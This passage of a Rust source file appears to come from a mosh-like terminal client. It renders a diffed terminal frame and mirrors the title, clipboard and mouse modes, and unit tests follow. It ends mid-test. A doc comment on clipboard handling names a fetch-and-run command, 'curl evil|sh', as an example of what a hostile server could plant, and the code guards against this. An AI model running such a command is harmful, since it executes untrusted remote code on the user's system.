//! Painting the synced grid, the predictions over it and a status line through [`KohBackend`]:
//! each frame is what the terminal is to show, diffed against what it shows ([`Painter`]). A frame
//! scrolls the terminal where rows only moved, paints only the cells that changed, emits SGR only
//! when the style changes, and is wrapped in synchronized output (DEC 2026), with autowrap off, so
//! it shows at once and nothing it paints can wrap or scroll.

use std::io;

use super::backend::{drawn, KohBackend};
use crate::predict::Overlay;
use crate::terminal::{Grid, Link, Size, MAXIMUM_CLIPBOARD_SIZE};
use fux_vt::{Attributes, CellRef, Cells, Color, MouseProtocolMode};
use unicode_width::{UnicodeWidthChar as _, UnicodeWidthStr as _};

/// What the terminal shows, so the next frame paints only what changed.
///
/// A frame covers the whole terminal: the screen clipped to it, blank where the screen does not
/// reach, the predictions over it, and the status line on its last row. Rows that only moved
/// since (the painted grid's rows, sharing their cells) are moved by scrolling the terminal, in a
/// scroll region, rather than repainted, where that writes less; only on a terminal exactly the
/// screen's size, and never the status line's row.
///
/// A frame is painted whole, on a cleared terminal, when the terminal may not show what was
/// painted: the first frame, after [`invalidate`](Self::invalidate) (a resume, a window resize),
/// and when the screen's or the terminal's size changed.
#[derive(Default)]
pub(super) struct Painter {
    last: Option<Painted>,
    /// Whether the terminal draws underline styles (`4:n`); if not, they are painted plain.
    underline_styles: bool,
    /// Whether hyperlinks are painted (OSC 8); if not, their text is painted plain.
    hyperlinks: bool,
}

/// A frame as it was painted.
struct Painted {
    /// The grid; its rows are shared, so keeping it copies no cells.
    grid: Grid,
    overlay: Overlay,
    /// The status line as painted, empty for none.
    status: String,
    terminal: Size,
}

/// A frame as the terminal is to show it.
struct View<'a> {
    grid: &'a Grid,
    overlay: &'a Overlay,
    /// The status line's glyphs, one a cell; empty for none.
    status: Vec<&'a str>,
    terminal: Size,
}

/// What one cell of a frame draws.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Paint<'a> {
    /// The right half of a wide glyph, which the glyph to its left covers.
    Covered,
    /// `glyph` in `style`, over two cells if `wide`, and the hyperlink it has, if any.
    Glyph {
        glyph: &'a str,
        style: Attributes,
        wide: bool,
        link: Option<&'a Link>,
    },
}

/// A blank cell in `style`.
const fn blank<'a>(style: Attributes) -> Paint<'a> {
    Paint::Glyph {
        glyph: " ",
        style,
        wide: false,
        link: None,
    }
}

/// What a cleared terminal, or a row a scroll brought in, shows: a blank in the default style.
const BLANK: Paint<'static> = blank(Attributes::new(Color::Default, Color::Default));

/// The status line's style: reverse video.
const STATUS: Attributes = Attributes::new(Color::Default, Color::Default).with_inverse(true);

/// The cells of the status line `line` on a terminal `cols` wide: a glyph a cell, one that is not
/// one column wide as `?`.
fn status_cells(line: &str, cols: u16) -> Vec<&str> {
    line.char_indices()
        .map(|(at, c)| match c.width() {
            Some(1) => line.get(at..at.saturating_add(c.len_utf8())).unwrap_or("?"),
            _ => "?",
        })
        .take(usize::from(cols))
        .collect()
}

impl<'a> View<'a> {
    /// The status line's glyph at `(row, col)`, if it covers that cell.
    fn status_at(&self, row: u16, col: u16) -> Option<&'a str> {
        (row.checked_add(1) == Some(self.terminal.rows))
            .then(|| self.status.get(usize::from(col)).copied())
            .flatten()
    }

    /// Whether the status line is on row `row`.
    fn status_on(&self, row: u16) -> bool {
        !self.status.is_empty() && row.checked_add(1) == Some(self.terminal.rows)
    }

    /// The screen's cell at `(row, col)`: the prediction there, else the grid's, with its link;
    /// `None` outside the screen.
    fn source(&self, row: u16, col: u16) -> Option<(CellRef<'a>, Option<&'a Link>)> {
        let cell = self.grid.cell(row, col)?;
        match self.overlay.cell(row, col) {
            Some(predicted) => Some((predicted.as_ref(), None)),
            None => Some((cell, self.grid.link(row, col))),
        }
    }

    /// The style of the prediction at `(row, col)`, if there is one.
    fn predicted_style(&self, row: u16, col: Option<u16>) -> Option<Attributes> {
        Some(self.overlay.cell(row, col?)?.attributes())
    }

    /// Whether the cell at `(row, col)` is a wide glyph painted whole: two columns wide, its right
    /// half the next cell, and both on the terminal and clear of the status line.
    fn whole(&self, row: u16, col: u16) -> bool {
        let Some(right) = col
            .checked_add(1)
            .filter(|&right| right < self.terminal.cols)
        else {
            return false;
        };
        self.source(row, col)
            .is_some_and(|(cell, _)| cell.is_wide() && cell.contents().width() == 2)
            && self
                .source(row, right)
                .is_some_and(|(cell, _)| cell.is_wide_continuation())
            && self.status_at(row, col).is_none()
            && self.status_at(row, right).is_none()
    }

    /// What `(row, col)` draws. A glyph is drawn only where it fills exactly its cells, so the
    /// cursor lands where the next one goes: one that does not (a hostile server's wide glyph in
    /// the last column, or in a narrow cell) is a blank, and so is a half its glyph does not
    /// cover. A blank where a prediction hides half a glyph of the grid takes the prediction's
    /// style, as a terminal leaves a wide glyph one of whose halves is overwritten.
    fn paint(&self, row: u16, col: u16) -> Paint<'a> {
        if let Some(glyph) = self.status_at(row, col) {
            return Paint::Glyph {
                glyph,
                style: STATUS,
                wide: false,
                link: None,
            };
        }
        let Some((cell, link)) = self.source(row, col) else {
            return BLANK;
        };
        if cell.is_wide_continuation() {
            let left = col.checked_sub(1);
            if left.is_some_and(|left| self.whole(row, left)) {
                return Paint::Covered;
            }
            let style = self
                .predicted_style(row, Some(col))
                .or_else(|| self.predicted_style(row, left));
            return blank(style.unwrap_or_else(|| cell.attributes()));
        }
        let style = cell.attributes();
        if cell.is_wide() {
            if self.whole(row, col) {
                return Paint::Glyph {
                    glyph: cell.contents(),
                    style,
                    wide: true,
                    link,
                };
            }
            return blank(
                self.predicted_style(row, col.checked_add(1))
                    .unwrap_or(style),
            );
        }
        // Read without its text when it has none, as most cells.
        let glyph = if cell.has_contents() {
            cell.contents()
        } else {
            " "
        };
        if glyph.width() != 1 {
            return blank(style);
        }
        Paint::Glyph {
            glyph,
            style,
            wide: false,
            link,
        }
    }

    /// Whether `row` draws what `other`'s row `from` draws: the same grid row (cells, links and
    /// wrap), the same predictions on it, and the same status line on it, if any.
    fn same_row(&self, row: u16, other: &Self, from: u16) -> bool {
        self.grid.same_row(row, other.grid, from)
            && self.overlay.row(row).eq(other.overlay.row(from))
            && self.status_on(row) == other.status_on(from)
            && (!self.status_on(row) || self.status == other.status)
    }
}

/// A scroll of the terminal: the rows `top..bottom` scroll by `by` (negative is up) in a scroll
/// region, the rows scrolled out of it are gone and the rows scrolled into it blank.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct Scroll {
    top: u16,
    bottom: u16,
    by: i16,
}

impl Scroll {
    /// The row that shows, after the scroll, at `row` of its region: `None` for a blank one.
    fn source(self, row: u16) -> Option<u16> {
        let source = u16::try_from(i32::from(row).checked_sub(i32::from(self.by))?).ok()?;
        (self.top..self.bottom).contains(&source).then_some(source)
    }
}

/// About what a scroll costs in bytes: the reset, the region, the scroll and the region's reset.
const SCROLL_COST: usize = 16;

/// About what moving the cursor to a cell costs in bytes.
const MOVE_COST: usize = 8;

/// About the bytes painting a row writes, given which of its cells differ from what the terminal
/// shows: a byte for each, and a cursor move to reach each run of them. Counting stops past
/// `limit`.
fn repaint_cost(differs: impl Iterator<Item = bool>, limit: usize) -> usize {
    let mut cost = 0_usize;
    let mut in_run = false;
    for differs in differs {
        if differs {
            let step = if in_run {
                1
            } else {
                MOVE_COST.saturating_add(1)
            };
            cost = cost.saturating_add(step);
            if cost > limit {
                break;
            }
        }
        in_run = differs;
    }
    cost
}

/// Whether `scroll` writes less than painting its rows in place: the rows it moves need no paint,
/// the rows it leaves blank need their glyphs, and every row in place needs what differs.
fn worth(scroll: Scroll, screen: &Grid, painted: &Grid) -> bool {
    let mut with = SCROLL_COST;
    for row in (scroll.top..scroll.bottom).filter(|&row| scroll.source(row).is_none()) {
        let differs = screen
            .row(row)
            .into_iter()
            .flat_map(Cells::iter)
            .map(|cell| !shows_blank(cell));
        with = with.saturating_add(repaint_cost(differs, usize::MAX));
    }
    let mut without = 0_usize;
    for row in scroll.top..scroll.bottom {
        let (Some(now), Some(before)) = (screen.row(row), painted.row(row)) else {
            continue;
        };
        let left = with.saturating_sub(without);
        let differs = now
            .iter()
            .zip(before.iter())
            .map(|(now, before)| now != before);
        without = without.saturating_add(repaint_cost(differs, left));
        if without > with {
            return true;
        }
    }
    false
}

/// The terminal scrolls that move the rows of the first `height` rows of `painted` where `screen`
/// has them: the moves [`Grid::moves_from`] finds, the longest first, each kept only if its region
/// overlaps none kept before, so the scrolls can run one after another, and if it paints less than
/// painting its rows in place.
fn scrolls(screen: &Grid, painted: &Grid, height: u16) -> Vec<Scroll> {
    let mut moves = screen.moves_from(painted, height);
    moves.sort_by_key(|shift| std::cmp::Reverse(shift.len));
    let mut kept: Vec<Scroll> = Vec::new();
    for shift in moves {
        let (Some(source), Some(destination)) = (shift.source(), shift.destination()) else {
            continue;
        };
        let scroll = Scroll {
            top: source.start.min(destination.start),
            bottom: source.end.max(destination.end),
            by: shift.by.get(),
        };
        if kept
            .iter()
            .all(|other| scroll.bottom <= other.top || other.bottom <= scroll.top)
            && worth(scroll, screen, painted)
        {
            kept.push(scroll);
        }
    }
    kept
}

/// For each of `rows` rows, the painted row the terminal shows there once `scrolls` ran: `None`
/// for a row they left blank.
fn shown_after(rows: u16, scrolls: &[Scroll]) -> Vec<Option<u16>> {
    (0..rows)
        .map(|row| {
            scrolls
                .iter()
                .find(|scroll| (scroll.top..scroll.bottom).contains(&row))
                .map_or(Some(row), |scroll| scroll.source(row))
        })
        .collect()
}

/// Whether `cell` draws what a row a scroll brought in shows: a blank in the default style.
fn shows_blank(cell: CellRef<'_>) -> bool {
    !cell.is_wide()
        && !cell.is_wide_continuation()
        && matches!(cell.contents(), "" | " ")
        && cell.attributes() == Attributes::default()
}

/// Make `want` the hyperlink the glyphs printed next have, in place of `open`: close the one open,
/// if any, and open `want`, if any.
fn switch_link<'a>(
    backend: &mut impl KohBackend,
    open: &mut Option<&'a Link>,
    want: Option<&'a Link>,
) -> io::Result<()> {
    if *open != want {
        if open.is_some() {
            backend.close_link()?;
        }
        if let Some(link) = want {
            backend.open_link(link)?;
        }
        *open = want;
    }
    Ok(())
}

/// Whether printing `glyph` right after `before` would continue `before`'s cluster: a skin-tone
/// modifier or a combining mark the program placed in a cell of its own, which a terminal joins to
/// the glyph printed just before it unless the cursor moved between them.
fn joins(before: Option<&str>, glyph: &str) -> bool {
    before.is_some_and(|before| {
        glyph
            .chars()
            .next()
            .is_some_and(|c| fux_vt::continues_cluster(before, c))
    })
}

/// Whether every terminal takes `glyph` as as wide as koh does: one character, not of ambiguous
/// width. After any other, where the cursor ends up is not known.
fn certain(glyph: &str) -> bool {
    let mut chars = glyph.chars();
    matches!((chars.next(), chars.next()), (Some(c), None) if c.width() == c.width_cjk())
}

impl Painter {
    /// Paint underline styles (`4:n`) if `on`, plain underlines if not; what is painted already
    /// is painted again.
    pub(super) fn set_underline_styles(&mut self, on: bool) {
        if self.underline_styles != on {
            self.underline_styles = on;
            self.invalidate();
        }
    }

    /// Paint hyperlinks if `on`, their text alone if not; what is painted already is painted
    /// again.
    pub(super) fn set_hyperlinks(&mut self, on: bool) {
        if self.hyperlinks != on {
            self.hyperlinks = on;
            self.invalidate();
        }
    }

    /// Forget what was painted: the next frame is painted whole.
    pub(super) fn invalidate(&mut self) {
        self.last = None;
    }

    /// Paint `screen` with the predictions `overlay` and an optional `status` line (reverse video,
    /// on the terminal's last row), on the terminal as large as `backend` says now.
    pub(super) fn render(
        &mut self,
        backend: &mut impl KohBackend,
        screen: &Grid,
        overlay: &Overlay,
        status: Option<&str>,
    ) -> io::Result<()> {
        let terminal = backend.size().unwrap_or_else(|_| screen.size());
        let line = status
            .map(|status| format!(" {status} "))
            .unwrap_or_default();
        let now = View {
            grid: screen,
            overlay,
            status: status_cells(&line, terminal.cols),
            terminal,
        };
        let last = self
            .last
            .take()
            .filter(|last| last.terminal == terminal && last.grid.size() == screen.size());
        let before = last.as_ref().map(|last| View {
            grid: &last.grid,
            overlay: &last.overlay,
            status: status_cells(&last.status, terminal.cols),
            terminal,
        });
        // Rows that only moved scroll into place, on a terminal exactly the screen's size, and
        // never the status line's row.
        let status_row = now.status_on(terminal.rows.saturating_sub(1))
            || before
                .as_ref()
                .is_some_and(|before| before.status_on(terminal.rows.saturating_sub(1)));
        let height = terminal.rows.saturating_sub(u16::from(status_row));
        let scrolls = match &last {
            Some(last) if terminal == screen.size() => scrolls(screen, &last.grid, height),
            _ => Vec::new(),
        };
        let shown = shown_after(terminal.rows, &scrolls);
        // The painted row the terminal shows at `row`, if it shows one: none on a cleared
        // terminal, or a row a scroll left blank.
        let shown_at = |row: u16| {
            let from = shown.get(usize::from(row)).copied().flatten()?;
            Some((before.as_ref()?, from))
        };

        backend.begin_frame()?;
        if before.is_none() {
            backend.clear()?;
        }
        let mut style: Option<Attributes> = None;
        if !scrolls.is_empty() {
            // Rows scrolled in take the current background: the default one.
            backend.reset_sgr()?;
            style = Some(Attributes::default());
            for scroll in &scrolls {
                backend.scroll_region(scroll.top, scroll.bottom, scroll.by)?;
            }
            backend.reset_scroll_region()?;
        }
        // The hyperlink the glyphs printed now have on the terminal, if any.
        let mut open_link: Option<&Link> = None;
        // Where the cursor is after the last glyph painted, if known.
        let mut cursor: Option<(u16, u16)> = None;
        // The glyph printed last, which the next one printed with no cursor move follows.
        let mut printed: Option<&str> = None;
        for row in 0..terminal.rows {
            let shows = shown_at(row);
            if shows.is_some_and(|(before, from)| now.same_row(row, before, from)) {
                continue;
            }
            let was = |col| shows.map_or(BLANK, |(before, from)| before.paint(from, col));
            let mut col = 0;
            while col < terminal.cols {
                let paint = now.paint(row, col);
                let Paint::Glyph {
                    glyph,
                    style: want,
                    wide,
                    link,
                } = paint
                else {
                    col = col.saturating_add(1);
                    continue;
                };
                let span = if wide { 2 } else { 1 };
                // A wide glyph is painted whole when either half of it changed.
                let differs = paint != was(col)
                    || (wide
                        && col
                            .checked_add(1)
                            .is_some_and(|next| now.paint(row, next) != was(next)));
                if differs {
                    if cursor != Some((row, col)) || joins(printed, glyph) {
                        backend.move_to(row, col)?;
                    }
                    let want = drawn(want, self.underline_styles);
                    if style != Some(want) {
                        backend.set_style(want)?;
                        style = Some(want);
                    }
                    let link = link.filter(|link| self.hyperlinks && link.safe());
                    switch_link(backend, &mut open_link, link)?;
                    if wide && !certain(glyph) {
                        // A terminal may draw it one cell wide: what the second showed goes.
                        backend.print("  ")?;
                        backend.move_to(row, col)?;
                    }
                    backend.print(glyph)?;
                    printed = Some(glyph);
                    cursor = col
                        .checked_add(span)
                        .filter(|&next| next < terminal.cols && certain(glyph))
                        .map(|next| (row, next));
                }
                col = col.saturating_add(span);
            }
        }
        // No link is left open, nor a style, for the user's shell to inherit.
        switch_link(backend, &mut open_link, None)?;
        if style.is_some() {
            backend.reset_sgr()?;
        }

        // The predicted cursor wins; one off the terminal is not shown.
        let (row, col) = overlay.cursor().unwrap_or_else(|| screen.cursor_position());
        let edge = |n: u16| n.saturating_sub(1);
        backend.move_to(row.min(edge(terminal.rows)), col.min(edge(terminal.cols)))?;
        if !screen.hide_cursor() && row < terminal.rows && col <= terminal.cols {
            backend.show_cursor()?;
        }
        backend.end_frame()?;
        self.last = Some(Painted {
            grid: screen.clone(),
            overlay: overlay.clone(),
            status: line,
            terminal,
        });
        backend.flush()
    }
}

/// `t` without control characters, which would break the OSC sequence it goes in.
fn sanitize_osc(t: &str) -> String {
    t.chars().filter(|c| !c.is_control()).collect()
}

/// Whether `s` is non-empty base64, as a clipboard set must be to be forwarded.
fn is_base64_payload(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
}

/// The window state the client mirrors beside the grid: title, icon, clipboard and bell count.
#[derive(Clone, Copy)]
pub struct WindowState<'a> {
    pub title: &'a str,
    pub icon: &'a str,
    pub clipboard: &'a str,
    pub bell_count: u64,
}

/// The input modes the real terminal is kept in, so the client receives the input it decodes, set
/// on the first frame and after a resume.
///
/// The server encodes keys, mouse events, focus changes and pastes as the program asked, so the
/// program's own modes are not mirrored for their own sake: the keypad and cursor keys stay
/// normal, bracketed paste and focus reporting stay on, so pastes arrive whole and focus changes
/// at all. Only mouse reporting follows the program ([`mouse_modes`]).
const INPUT_MODES: &[u8] = b"\x1b>\x1b[?1l\x1b[?2004h\x1b[?1004h";

/// The bytes taking the real terminal's mouse reporting from `prev` to `mouse`: on while the
/// program wants mouse events (or the scrollback view is open), always in SGR, which carries every
/// position. The old mode goes off before the new one comes on, so a terminal that keeps several
/// is never left reporting the old one too.
fn mouse_modes(prev: MouseProtocolMode, mouse: MouseProtocolMode) -> Vec<u8> {
    use MouseProtocolMode as Mode;
    let number = |mode| match mode {
        Mode::Press => Some(9),
        Mode::PressRelease => Some(1000),
        Mode::ButtonMotion => Some(1002),
        Mode::AnyMotion => Some(1003),
        Mode::None | _ => None,
    };
    if prev == mouse {
        return Vec::new();
    }
    let (off, on) = (number(prev), number(mouse));
    let mut out = String::new();
    out.extend(off.map(|off| format!("\x1b[?{off}l")));
    out.extend(on.map(|on| format!("\x1b[?{on}h")));
    match (off, on) {
        (None, Some(_)) => out.push_str("\x1b[?1006h"),
        (Some(_), None) => out.push_str("\x1b[?1006l"),
        _ => {}
    }
    out.into_bytes()
}

/// What the client mirrored onto the real terminal beside the grid (title, icon, input modes), so
/// each is emitted only when it changes, and what it last saw of the server's clipboard and bell,
/// which it acts on only when they change.
#[derive(Default)]
pub(super) struct OutOfBand {
    /// Prepended to the title (and to an icon equal to it), as mosh's `[mosh] `; empty for none.
    title_prefix: String,
    /// Whether the server may set the clipboard: on unless `--no-clipboard`. A hostile server can
    /// then replace what the user copied (a command for `curl evil|sh`), so only base64 within
    /// the cap is forwarded, and the clipboard is never read.
    clipboard_enabled: bool,
    /// Whether the program set a title: until then the user's is left alone, after it even a reset
    /// to empty is mirrored (mosh's `title_initialized`).
    title_initialized: bool,
    last_title: String,
    last_icon: String,
    /// The mouse reporting last set; `None` until the input modes are set.
    mouse: Option<MouseProtocolMode>,
    /// The server's clipboard and bell as last seen: `None` until the first frame after the client
    /// started, whose are taken as they are, so neither what was copied nor what rang before it
    /// reaches the user's terminal.
    seen: Option<Seen>,
}

/// The server's clipboard and bell count, as [`OutOfBand`] last saw them.
struct Seen {
    clipboard: String,
    bell: u64,
}

impl OutOfBand {
    /// Mirroring that prefixes the title with `title_prefix`.
    pub(super) fn with_title_prefix(title_prefix: String) -> Self {
        Self {
            title_prefix,
            ..Self::default()
        }
    }

    /// Whether the server may set the clipboard.
    #[must_use]
    pub(super) fn with_clipboard(mut self, enabled: bool) -> Self {
        self.clipboard_enabled = enabled;
        self
    }

    /// Forget what was mirrored, so the next [`emit`](Self::emit) re-asserts it (after a resume,
    /// which reset the terminal). What was seen of the clipboard and bell stays: neither happened
    /// again.
    pub(super) fn invalidate(&mut self) {
        self.title_initialized = false;
        self.last_title.clear();
        self.last_icon.clear();
        self.mouse = None;
    }

    /// The first frame of the run arrived, with `win`: what it shows of the clipboard and bell is
    /// what was, not what changed.
    pub(super) fn prime(&mut self, win: WindowState<'_>) {
        self.seen.get_or_insert_with(|| Seen {
            clipboard: win.clipboard.to_owned(),
            bell: win.bell_count,
        });
    }

    /// Emit what changed since the last frame, as mosh's `Display::new_frame` does.
    pub(super) fn emit(
        &mut self,
        backend: &mut impl KohBackend,
        mouse: MouseProtocolMode,
        win: WindowState<'_>,
    ) -> io::Result<()> {
        self.emit_window_title(backend, win.title, win.icon)?;
        if let Some(seen) = &mut self.seen {
            if win.clipboard != seen.clipboard {
                win.clipboard.clone_into(&mut seen.clipboard);
                // Only if opted in, and only base64 within the cap.
                if self.clipboard_enabled
                    && !win.clipboard.is_empty()
                    && win.clipboard.len() <= MAXIMUM_CLIPBOARD_SIZE
                    && is_base64_payload(win.clipboard)
                {
                    backend.set_clipboard(win.clipboard)?;
                }
            }
            // One bell however many rang; a count that fell is a new session's.
            if win.bell_count != seen.bell {
                if win.bell_count > seen.bell {
                    backend.bell()?;
                }
                seen.bell = win.bell_count;
            }
        }
        let mode_bytes = match self.mouse {
            Some(prev) => mouse_modes(prev, mouse),
            None => [INPUT_MODES, &mouse_modes(MouseProtocolMode::None, mouse)].concat(),
        };
        if !mode_bytes.is_empty() {
            backend.write_input_modes(&mode_bytes)?;
        }
        self.mouse = Some(mouse);
        Ok(())
    }

    /// Title and icon, as mosh emits them: one `]0;` when they are equal, else `]1;` and `]2;`.
    fn emit_window_title(
        &mut self,
        backend: &mut impl KohBackend,
        title: &str,
        icon: &str,
    ) -> io::Result<()> {
        if self.title_initialized {
            if title == self.last_title && icon == self.last_icon {
                return Ok(());
            }
        } else {
            if title.is_empty() && icon.is_empty() {
                return Ok(()); // nothing set yet — don't blank the user's terminal title
            }
            self.title_initialized = true;
        }
        self.last_title = title.to_string();
        self.last_icon = icon.to_string();
        // The icon is prefixed only if equal to the title, which keeps them equal (mosh's
        // `prefix_window_title`).
        let icon_eq_title = icon == title;
        let t = format!("{}{}", self.title_prefix, sanitize_osc(title));
        let ic = if icon_eq_title {
            format!("{}{}", self.title_prefix, sanitize_osc(icon))
        } else {
            sanitize_osc(icon)
        };
        if ic == t {
            backend.set_window_title(&t)
        } else {
            backend.set_window_icon_and_title(&ic, &t)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::client::backend::CaptureBackend;
    use crate::predict::{PredictionEngine, TtyModes};
    use crate::terminal::TerminalScreen;

    /// The size of most terminals here.
    const SMALL: Size = Size::new(6, 20);

    /// The grid a `rows`×`cols` screen shows after `bytes`.
    fn grid(rows: u16, cols: u16, bytes: &[u8]) -> Grid {
        TerminalScreen::from_bytes(rows, cols, bytes)
            .screen()
            .clone()
    }

    fn screen_of(bytes: &[u8]) -> Grid {
        grid(24, 80, bytes)
    }

    /// Paint one frame with `painter` on a terminal of `size`, and return the bytes (UTF-8).
    fn paint_at(
        painter: &mut Painter,
        size: Size,
        screen: &Grid,
        overlay: &Overlay,
        status: Option<&str>,
    ) -> String {
        let mut backend = CaptureBackend {
            size,
            ..CaptureBackend::default()
        };
        painter
            .render(&mut backend, screen, overlay, status)
            .unwrap();
        String::from_utf8(backend.bytes).unwrap()
    }

    /// Paint one frame with `painter` on a 24×80 terminal.
    fn paint_frame(
        painter: &mut Painter,
        screen: &Grid,
        overlay: &Overlay,
        status: Option<&str>,
    ) -> String {
        paint_at(painter, Size::new(24, 80), screen, overlay, status)
    }

    /// `screen` painted alone, as the first frame on a 24×80 terminal.
    fn first_frame(screen: &Grid) -> String {
        paint_frame(&mut Painter::default(), screen, &Overlay::default(), None)
    }

    /// Paint `grid` with `overlay` onto `terminal`, at its size.
    fn paint_into(
        painter: &mut Painter,
        terminal: &mut fux_vt::Parser,
        grid: &Grid,
        overlay: &Overlay,
    ) {
        let (rows, cols) = terminal.screen().size().into();
        let bytes = paint_at(painter, Size::new(rows, cols), grid, overlay, None);
        terminal.process(bytes.as_bytes()).unwrap();
    }

    /// The real terminal is kept where the client receives what it decodes, whatever the program
    /// set: normal cursor and keypad keys, bracketed paste and focus reporting on, and mouse
    /// reports in SGR while the program asks for any. A new mouse mode turns the old one off
    /// first, so the terminal never reports both.
    #[test]
    fn the_real_terminal_reports_input_whatever_the_program_set() {
        let mut oob = OutOfBand::default();
        let mut emit = |bytes: &[u8]| oob_emit(&mut oob, &screen_of(bytes), win("", "", "", 0));
        assert_eq!(
            emit(b"\x1b[?1h\x1b=\x1b[?2004l"),
            "\x1b>\x1b[?1l\x1b[?2004h\x1b[?1004h"
        );
        assert_eq!(emit(b"\x1b[?9h"), "\x1b[?9h\x1b[?1006h");
        assert_eq!(emit(b"\x1b[?1003h\x1b[?1005h"), "\x1b[?9l\x1b[?1003h");
        assert_eq!(emit(b"\x1b[?1002h"), "\x1b[?1003l\x1b[?1002h");
        assert_eq!(emit(b""), "\x1b[?1002l\x1b[?1006l");
        assert_eq!(emit(b"\x1b[?1000h"), "\x1b[?1000h\x1b[?1006h");
    }

    #[test]
    fn status_line_truncation_is_panic_free_across_all_widths() {
        // The peer-controlled (clamped) screen width must never make the multi-byte status
        // line panic. Sweep every width in [MIN_DIM, MAX_DIM] with the real link-down banner.
        use crate::terminal::{MAX_DIM, MIN_DIM};
        let status = "[koh] link down — resuming… 5s";
        for cols in MIN_DIM..=MAX_DIM {
            let screen = grid(MIN_DIM, cols, b"x");
            let mut painter = Painter::default();
            paint_at(
                &mut painter,
                screen.size(),
                &screen,
                &Overlay::default(),
                Some(status),
            );
        }
    }

    /// The bytes around a frame's cells: open the synchronized frame with autowrap off, then
    /// after the cells place the cursor at the 1-based `cursor`, show it, and close the frame.
    fn framed(cells: &str, cursor: &str) -> String {
        format!("\x1b[?2026h\x1b[?25l\x1b[?7l{cells}\x1b[{cursor}H\x1b[?25h\x1b[?7h\x1b[?2026l")
    }

    /// What `set_style` emits for the default style.
    const PLAIN: &str = "\x1b[m\x1b[39m\x1b[49m";

    #[test]
    fn a_first_frame_clears_the_terminal_and_paints_only_what_is_not_blank() {
        assert_eq!(
            first_frame(&screen_of(b"hi")),
            framed(&format!("\x1b[m\x1b[2J\x1b[1;1H{PLAIN}hi\x1b[m"), "1;3")
        );
    }

    /// A frame after another paints only the cells that changed, moving the cursor only to reach
    /// one: an unchanged wide glyph between two is not painted, nor a cluster a variation selector
    /// widens ("❤️", which fills its wide cell exactly); a changed wide glyph is painted whole,
    /// and the cell after it follows without a move.
    #[test]
    fn a_frame_paints_only_the_cells_that_changed() {
        for (before, after, cells, cursor) in [
            ("hello", "hello", String::new(), "1;6"),
            ("hello", "hellO", format!("\x1b[1;5H{PLAIN}O\x1b[m"), "1;6"),
            (
                "a日b",
                "c日d",
                format!("\x1b[1;1H{PLAIN}c\x1b[1;4Hd\x1b[m"),
                "1;5",
            ),
            (
                "日本x",
                "日字y",
                format!("\x1b[1;3H{PLAIN}字y\x1b[m"),
                "1;6",
            ),
            (
                "\u{2764}\u{fe0f}ab",
                "\u{2764}\u{fe0f}aB",
                format!("\x1b[1;4H{PLAIN}B\x1b[m"),
                "1;5",
            ),
        ] {
            let mut painter = Painter::default();
            let empty = Overlay::default();
            paint_frame(&mut painter, &screen_of(before.as_bytes()), &empty, None);
            let changed = paint_frame(&mut painter, &screen_of(after.as_bytes()), &empty, None);
            assert_eq!(changed, framed(&cells, cursor), "{before} then {after}");
        }
    }

    /// After a glyph a terminal may lay out wider than koh does (an ambiguous-width one), the
    /// next is placed with a cursor move, so it lands where it belongs whatever the terminal did.
    #[test]
    fn a_glyph_of_uncertain_width_is_followed_by_a_cursor_move() {
        let painted = first_frame(&screen_of("┘x".as_bytes()));
        assert!(painted.contains("┘\x1b[1;2Hx"), "{painted:?}");
    }

    #[test]
    fn a_resize_or_a_resume_repaints_everything() {
        let screen = screen_of(b"hello");
        let empty = Overlay::default();
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &empty, None);
        // A resume (or a window resize) invalidates what was painted.
        painter.invalidate();
        assert_eq!(
            paint_frame(&mut painter, &screen, &empty, None),
            first_frame(&screen)
        );
        // A screen of another size.
        let small = grid(10, 40, b"hello");
        assert_eq!(
            paint_frame(&mut painter, &small, &empty, None),
            first_frame(&small)
        );
    }

    /// The status line is painted where it changed, over the row the screen has there, and that
    /// row is painted again once it goes.
    #[test]
    fn the_status_line_paints_only_what_changed() {
        let screen = screen_of(b"hello\x1b[24;1Hbottom row");
        let mut painter = Painter::default();
        let empty = Overlay::default();
        paint_frame(&mut painter, &screen, &empty, None);
        let up = paint_frame(&mut painter, &screen, &empty, Some("down 1s"));
        assert!(up.contains(" down 1s ") && !up.contains("hello"), "{up:?}");
        assert!(
            !up.contains("row"),
            "the row past the status line stays: {up:?}"
        );
        let same = paint_frame(&mut painter, &screen, &empty, Some("down 1s"));
        assert_eq!(
            same,
            framed("", "24;11"),
            "an unchanged status line is not painted"
        );
        let next = paint_frame(&mut painter, &screen, &empty, Some("down 2s"));
        assert_eq!(
            next,
            framed("\x1b[24;7H\x1b[m\x1b[7m\x1b[39m\x1b[49m2\x1b[m", "24;11")
        );
        let gone = paint_frame(&mut painter, &screen, &empty, None);
        assert!(
            gone.contains("bottom ") && !gone.contains("down"),
            "{gone:?}"
        );
    }

    /// A predicted glyph is painted and cleared like a cell, a wide one over the narrow cells it
    /// covers: each frame paints only the cells that changed.
    #[test]
    fn a_prediction_is_painted_and_cleared_like_a_cell() {
        let narrow = Overlay::of([((0, 2), "Z", Attributes::default(), true)], Some((0, 3)));
        let wide = Overlay::of([((0, 1), "世", Attributes::default(), true)], None);
        for (text, overlay, at, (glyph, cursor), (gone, cursor_after)) in [
            ("ab", narrow, "1;3", ("Z", "1;4"), (" ", "1;3")),
            ("abcd", wide, "1;2", ("世", "1;5"), ("bc", "1;5")),
        ] {
            let screen = screen_of(text.as_bytes());
            let mut painter = Painter::default();
            let mut paint = |overlay: &Overlay| paint_frame(&mut painter, &screen, overlay, None);
            paint(&Overlay::default());
            assert_eq!(
                paint(&overlay),
                framed(&format!("\x1b[{at}H{PLAIN}{glyph}\x1b[m"), cursor)
            );
            assert_eq!(
                paint(&Overlay::default()),
                framed(&format!("\x1b[{at}H{PLAIN}{gone}\x1b[m"), cursor_after)
            );
        }
    }

    #[test]
    fn a_predicted_narrow_glyph_over_a_wide_cell_blanks_its_right_half() {
        // What a terminal shows once the server echoes the same glyph there.
        let screen = screen_of("本x".as_bytes());
        let narrow = Overlay::of([((0, 0), "a", Attributes::default(), true)], Some((0, 1)));
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::default(), None);
        let painted = paint_frame(&mut painter, &screen, &narrow, None);
        assert_eq!(painted, framed(&format!("\x1b[1;1H{PLAIN}a \x1b[m"), "1;2"));
        let mut terminal = terminal_of(24, 80);
